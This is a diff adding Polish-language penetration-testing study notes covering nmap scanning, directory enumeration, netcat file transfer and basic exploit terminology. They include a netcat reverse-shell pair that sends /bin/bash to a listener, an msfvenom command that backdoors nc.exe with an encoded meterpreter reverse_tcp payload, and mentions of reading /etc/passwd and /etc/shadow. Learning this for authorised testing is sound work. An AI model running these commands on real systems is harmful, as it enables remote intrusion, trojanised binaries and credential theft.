@@ -1,0 +1,67 @@
+mamy se ip
+puszczamy nmapa
+sprawdzamy ip w przegladarce
+enumerujemy katalogi
+robots humans ._.
+nmap -p6696 -vv 192.168.0.100
+zapisujemy wyniki gobustera
+tilux 
+czym jest ttl
+
+
+
+netcat
+testowanie portu
+nc 192.168.0.10 443
+
+transfer plikow
+listener: nc -nlvp 8000 > outfile
+sender: nc 192.168.1.10 8000 < inputfile
+
+sieciowy wiersz polecen (reverse shell)
+attacker: nc -nlvp 8000
+victim: nc 192.168.1.10 8000 -e /bin/bash
+na windowsie: zamiast /bin/bash dajemy cmd.exe
+
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+podatnosc - podatnosc - blad w sofcie, bug
+exploit - kod, ktory wykorzystuje podatnosc
+payload - obudowa do shellcoda
+shellcode - kod, ktory ma za zadanie zwrocic shella
+
+meterpreter - sesja meterpreterowa
+kurde zajebiste
+wstrzykiwanie binarek w binarki :O
+msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.171.134 lport=443 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o ncx.exe
+
+msfvenom
+cmd.dll
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+hostowanie pliku przez pythona w konsoli
+toole
+netstat
+suckless C
+
+etc/passwd
+etc/shadow
+
+spine shell
+reverse shell
+swoj shell w msvenom 
+co robi soapui
